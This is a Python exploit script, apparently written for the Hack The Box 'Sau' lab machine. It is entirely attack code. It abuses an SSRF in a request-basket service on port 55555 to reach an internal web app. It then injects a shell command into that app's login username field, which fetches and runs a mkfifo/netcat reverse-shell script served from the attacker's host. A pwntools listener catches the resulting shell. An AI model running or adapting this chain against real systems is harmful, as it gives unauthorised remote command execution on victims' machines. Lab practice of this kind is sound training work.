import string
import random
import subprocess
import requests
import signal
import sys
import os
import threading
import time
import argparse
import shutil
from pwn import log, listen

parser = argparse.ArgumentParser(description="Programa para configurar conexiones.")
parser.add_argument('-rhost', '--remote-host', dest='victim_ip', required=True, help="Ip of the sau machiene.")
parser.add_argument('-lhost', '--local-hot', dest='attacker_ip', required=True, help="Your ip.")
parser.add_argument('-lport', '--local-port', dest='attacker_port', type=int, required=True,
                    help="Port for your nc listener.")
args = parser.parse_args()

victim = args.victim_ip
attacker = args.attacker_ip
nc_port = args.attacker_port

sau_web_service_port = "55555"
localhost = "127.0.0.1"
url_vulnerable_service = f"http://{victim}:{sau_web_service_port}/"
ssrf_url = f"http://{victim}:{sau_web_service_port}/api/baskets/"
ssrf_payload = f"http://{localhost}:80/"
# According to nmap port 80 is filtered. That means the firewall is blocking port 80.
# Which means it could be some web service running only accesible from inside the machine.

range_basket_name = 10
http_server = None


def kill_processes():
    if http_server and http_server.poll() is None:
        time.sleep(2)
        http_server.terminate()
        http_server.wait()

        time.sleep(2)
        os.system("rm rev.sh")


def exit_handler(signum, frame):
    sys.exit(1)


def check_vpn_connection(target_ip):
    # progress_controller("Checking connection", )
    p = log.progress("Connection")
    p.status("Checking connection to HTB VPN")

    time.sleep(2)
    try:
        subprocess.run(["ping", "-c", "1", target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        p.success("Target [" + target_ip + "] reachable. Connection successfully checked.")
    except:
        print("Target [" + target_ip + "] unreachable. Make sure you are connected to Hack the Box VPN.")
        sys.exit(1)


def check_python_version():
    p = log.progress("Python")
    p.status("Checking python system version")

    time.sleep(2)
    status = " version found"
    if shutil.which("python3"):
        p.success("python3" + status)
        return "python3"
    elif shutil.which("python"):
        p.success("python" + status)
        return "python"


def start_http_server(python_version):
    global http_server

    p = log.progress("Server")
    p.status("poping simple http server")

    try:
        http_server = subprocess.Popen(["python3", "-m", "http.server", "8003"], stdout=subprocess.DEVNULL,
                                       stderr=subprocess.DEVNULL)
        p.success("Server started successfully")
    except subprocess.CalledProcessError as e:
        print("Error a la hora de iniciar el servidor " + e)
        sys.exit(1)


def get_rce():
    p = log.progress("Exploting...")
    p.status("Creating a basket")

    # choose from all lowercase letter
    letters = string.ascii_lowercase
    basket_name = ''.join(random.choice(letters) for i in range(range_basket_name))

    # We need to provide to the fordward_url the ip we want to call.
    data = {
        "forward_url": f"{ssrf_payload}",
        "proxy_response": True,
        "insecure_tls": False,
        "expand_path": True,
        "capacity": 250
    }

    try:
        r = requests.request(method="POST", url=ssrf_url + basket_name, json=data)
        r.raise_for_status()
    except requests.exceptions.Timeout:
        print(
            "Request timed out. The server didn't respond within the specified time. Make sure you are connected to the vpn.")
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

    p.status(f"basket [{basket_name}] created")
    time.sleep(2)

    if r.status_code == 201:
        p.success("Sending the payload to get the RCE")
        time.sleep(1)

        res = requests.request(method="GET", url=url_vulnerable_service + basket_name)

        if res.status_code == 200:
            os.system(f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {attacker} {nc_port} >/tmp/f' > rev.sh")
            os.system("chmod +x rev.sh")

            threading.Thread(target=os.system, args=[
                f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://{attacker}:8003/rev.sh | bash`'"]).start()

            listener = listen(nc_port, timeout=20).wait_for_connection()

            if listener.sock:
                print("\n")

                kill_processes()
                listener.interactive()


if __name__ == '__main__':
    # Program flow control
    signal.signal(signal.SIGINT, exit_handler)

    # Check vpn connection - check if the target is available to connect
    check_vpn_connection(victim)

    # Check python version
    python_version = check_python_version()

    # Start the server
    start_http_server(python_version)

    # start the explotation to get remote code execution
    get_rce()